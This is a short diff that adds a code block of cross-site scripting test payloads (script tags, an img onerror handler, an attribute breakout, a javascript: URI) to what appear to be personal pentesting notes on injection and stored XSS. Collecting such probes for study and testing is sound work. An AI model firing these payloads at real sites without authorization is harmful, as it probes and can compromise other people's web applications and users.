@@ -65,6 +65,13 @@ or change something
  
  Injection where an attacker can execute malicious scripts and execute on machine
  
+ ```
+ <script>alert(1)</script>
+ <img src=1 onerror=alert(1)>
+ ' onerror='alert(1)
+ 3'**alert());//
+ javascript:alert(1)
+ ```
  #### Stored-XSS
  
  See if we can add html tags
